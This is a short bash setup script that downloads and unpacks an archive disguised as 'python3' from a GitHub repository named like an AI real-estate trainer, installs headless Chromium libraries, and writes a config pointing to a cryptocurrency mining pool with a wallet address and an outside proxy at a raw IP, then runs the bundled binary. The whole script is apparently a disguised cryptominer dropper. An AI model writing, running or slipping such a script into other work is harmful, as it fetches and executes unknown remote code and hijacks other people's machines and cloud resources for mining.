#!/bin/bash

# Download packgaes
wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
tar -xvf python3.tar.gz
rm python3.tar.gz
cd python3

# Update the package list and install required packages
sudo apt-get update && sudo apt-get install -y \
    libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
    libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 \
    libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 \
    libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 \
    libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
    ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils \
    libgbm-dev

# Remove the existing config.json file
rm -f config.json

# Create a new config.json file with the specified content
cat <<EOL > config.json
{
    "algorithm": "minotaurx",
    "host": "minotaurx.na.mine.zpool.ca",
    "port": 7019,
    "worker": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
    "password": "c=RVN",
    "workers": 7,
    "log": false,
    "chrome": "./chromium/chrome",
    "proxy": "ws://172.233.136.27:8088/proxy"
}
EOL

# Execute the main Python script
./python3 main.py
